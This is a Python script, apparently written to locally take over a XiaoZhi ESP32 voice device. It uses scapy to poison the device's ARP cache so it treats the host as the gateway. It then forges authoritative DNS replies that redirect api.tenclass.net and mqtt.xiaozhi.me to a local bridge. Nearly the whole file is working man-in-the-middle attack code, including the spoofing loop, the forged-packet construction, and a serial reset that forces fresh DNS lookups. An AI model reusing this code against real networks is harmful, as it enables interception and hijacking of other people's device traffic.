#!/usr/bin/env python3
"""
XiaoZhi DNS Spoofer
- ARP 欺骗网关, 劫持 ESP32 DNS 查询
- 将 api.tenclass.net / mqtt.xiaozhi.me 重定向到本机 Bridge
- 配合 Bridge WSS(443) + MQTT(1883) 实现本地接管
"""

import os, sys, time, threading, signal, struct, socket
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import Ether, ARP

# ========= 配置 =========
OUR_IP = "192.168.0.135"
OUR_MAC = "24:b2:b9:6d:01:51"
GATEWAY_IP = "192.168.0.1"
GATEWAY_MAC = "8c:44:bb:2f:83:40"
ESP32_IP = "192.168.0.101"
ESP32_MAC = "14:c1:9f:36:86:ec"
IFACE = None  # auto-detect

# 欺骗目标: hostname -> redirect_ip
SPOOF_MAP = {
    b"api.tenclass.net": OUR_IP,
    b"mqtt.xiaozhi.me": OUR_IP,
}

running = True
stats = {"arp_sent": 0, "dns_spoofed": 0}

# ========= 检测接口 =========
def find_iface():
    from scapy.arch.windows import get_windows_if_list
    for iface in get_windows_if_list():
        ips = iface.get('ips', [])
        if OUR_IP in ips:
            return iface['name']
    # fallback: use Npcap
    for iface in get_windows_if_list():
        if 'Npcap' in iface.get('description', ''):
            mac = iface.get('mac', '')
            if mac.lower() == OUR_MAC.lower().replace(':', '-'):
                return iface['name']
    return conf.iface

# ========= ARP 欺骗线程 =========
def arp_spoof_loop():
    """持续发送 ARP 响应，告诉 ESP32 网关的 MAC 是我们"""
    global running, stats
    while running:
        # Tell ESP32: gateway is at OUR_MAC (单向欺骗即可)
        pkt = Ether(src=OUR_MAC, dst=ESP32_MAC) / \
              ARP(op=2, hwsrc=OUR_MAC, psrc=GATEWAY_IP,
                  hwdst=ESP32_MAC, pdst=ESP32_IP)
        try:
            sendp(pkt, iface=IFACE, verbose=False)
            stats["arp_sent"] += 1
        except Exception as e:
            print(f"[ARP] Error: {e}")
        time.sleep(0.5)

# ========= DNS 欺骗 =========
def dns_spoof_callback(pkt):
    """处理拦截到的数据包，检测 DNS 查询并欺骗"""
    global stats
    if not running:
        return
    
    try:
        if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
            return
        if pkt[UDP].dport != 53:
            return  # 不是 DNS 查询
        if pkt[IP].src != ESP32_IP:
            return  # 不是来自 ESP32
        
        dns = pkt[DNS]
        if dns.qr != 0:
            return  # 不是查询 (是响应)
        
        qname = dns[DNSQR].qname
        # 去掉末尾的 '.'
        qname_bytes = qname.rstrip(b'.') if isinstance(qname, bytes) else qname.rstrip('.').encode()
        
        if qname_bytes not in SPOOF_MAP:
            return  # 不是我们要欺骗的域名
        
        target_ip = SPOOF_MAP[qname_bytes]
        print(f"[DNS] 🎯 Spoof: {qname_bytes.decode()} → {target_ip}")
        
        # 构造 DNS 响应
        dns_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                   UDP(sport=53, dport=pkt[UDP].sport) / \
                   DNS(
                       id=dns.id,
                       qr=1,  # response
                       aa=1,  # authoritative
                       rd=dns.rd,
                       ra=1,
                       qdcount=1,
                       ancount=1,
                       qd=dns[DNSQR],
                       an=DNSRR(rrname=qname, type='A', rclass='IN', ttl=60, rdata=target_ip)
                   )
        send(dns_resp, iface=IFACE, verbose=False)
        stats["dns_spoofed"] += 1
        
    except Exception as e:
        print(f"[DNS] Error: {e}")

# ========= 流量转发 (可选) =========
def forward_traffic(pkt):
    """转发非 DNS 流量，维持 ESP32 网络连接"""
    if not running:
        return
    try:
        if pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS):
            if pkt[UDP].dport == 53 and pkt[IP].src == ESP32_IP:
                return  # DNS 查询已由 dns_spoof_callback 处理
        
        # 只转发从 ESP32 来的、目标非本机的流量
        if not pkt.haslayer(IP):
            return
        if pkt[IP].src != ESP32_IP:
            return
        if pkt[IP].dst == OUR_IP:
            return  # 发给我们的，本机处理
        
        # 修改目标 MAC 为真实网关，转发
        pkt[Ether].dst = GATEWAY_MAC
        pkt[Ether].src = OUR_MAC
        sendp(pkt, iface=IFACE, verbose=False)
    except:
        pass

# ========= ESP32 复位 =========
def reset_esp32():
    """通过 esptool 复位 ESP32，清除 DNS 缓存"""
    import serial
    import serial.tools.list_ports
    
    # 查找 ESP32 串口
    ports = serial.tools.list_ports.comports()
    esp_port = None
    for p in ports:
        if "USB" in p.description or "CP210" in p.description or "CH340" in p.description or "Serial" in p.description:
            if getattr(p, 'vid', None) in (0x303a, 0x10C4, 0x1A86, 0x0403):
                esp_port = p.device
                break
            # also check by description keywords
            desc_lower = p.description.lower()
            if any(k in desc_lower for k in ['esp', 'usb-serial', 'cp210', 'ch340', 'ch343', 'serial']):
                esp_port = p.device
                break
    
    if not esp_port:
        # try all serial ports
        for p in ports:
            esp_port = p.device
            break
    
    if not esp_port:
        print("[ESP32] ❌ 未找到串口，跳过复位")
        return False
    
    print(f"[ESP32] 串口: {esp_port}, 正在复位...")
    try:
        ser = serial.Serial(esp_port, 115200, timeout=1)
        ser.setDTR(False)
        time.sleep(0.1)
        ser.setRTS(True)
        time.sleep(0.1)
        ser.setRTS(False)
        time.sleep(0.1)
        ser.setDTR(True)
        time.sleep(0.5)
        ser.close()
        print("[ESP32] ✅ 复位完成")
        return True
    except Exception as e:
        print(f"[ESP32] ⚠️ 复位失败: {e}")
        return False

# ========= 恢复 ARP =========
def restore_arp():
    """恢复正常的 ARP 表"""
    print("[ARP] 🔄 恢复 ARP...")
    for _ in range(5):
        # Tell ESP32: gateway is at real GATEWAY_MAC
        pkt = Ether(src=GATEWAY_MAC, dst=ESP32_MAC) / \
              ARP(op=2, hwsrc=GATEWAY_MAC, psrc=GATEWAY_IP,
                  hwdst=ESP32_MAC, pdst=ESP32_IP)
        try:
            sendp(pkt, iface=IFACE, verbose=False)
        except:
            pass
        time.sleep(0.3)
    print("[ARP] ✅ 已恢复")

# ========= 主函数 =========
def main():
    global IFACE, running
    
    IFACE = find_iface()
    print(f"[*] 接口: {IFACE}")
    print(f"[*] 本机: {OUR_IP} / {OUR_MAC}")
    print(f"[*] 网关: {GATEWAY_IP} / {GATEWAY_MAC}")
    print(f"[*] ESP32: {ESP32_IP} / {ESP32_MAC}")
    print(f"[*] 欺骗规则:")
    for k, v in SPOOF_MAP.items():
        print(f"      {k.decode()} → {v}")
    
    # Patch: 让 scapy 不检查 IP 校验和
    conf.checkIPaddr = False
    
    # ===== 1. 复位 ESP32 =====
    print("\n[1/3] 复位 ESP32...")
    reset_esp32()
    print("[*] 等待 ESP32 重启 (20秒)...")
    
    # ===== 2. 启动 ARP 欺骗 =====
    print("[2/3] 启动 ARP 欺骗...")
    arp_thread = threading.Thread(target=arp_spoof_loop, daemon=True)
    arp_thread.start()
    time.sleep(1)
    
    # ===== 3. 启动 DNS 嗅探 =====
    print("[3/3] 启动 DNS 嗅探...")
    
    # 嗅探 DNS 查询
    sniff_filter = f"udp port 53 and src host {ESP32_IP}"
    
    def signal_handler(sig, frame):
        global running
        print("\n[*] 正在停止...")
        running = False
    
    signal.signal(signal.SIGINT, signal_handler)
    
    print(f"\n{'='*50}")
    print(f"  DNS 欺骗已启动")
    print(f"  嗅探规则: {sniff_filter}")
    print(f"  按 Ctrl+C 停止")
    print(f"{'='*50}\n")
    
    # 主嗅探循环
    try:
        sniff(
            filter=sniff_filter,
            prn=dns_spoof_callback,
            store=False,
            iface=IFACE,
            stop_filter=lambda x: not running
        )
    except KeyboardInterrupt:
        pass
    finally:
        running = False
        restore_arp()
        print(f"\n[*] 统计: ARP={stats['arp_sent']}, DNS欺骗={stats['dns_spoofed']}")
        print("[*] 已退出")

if __name__ == "__main__":
    main()
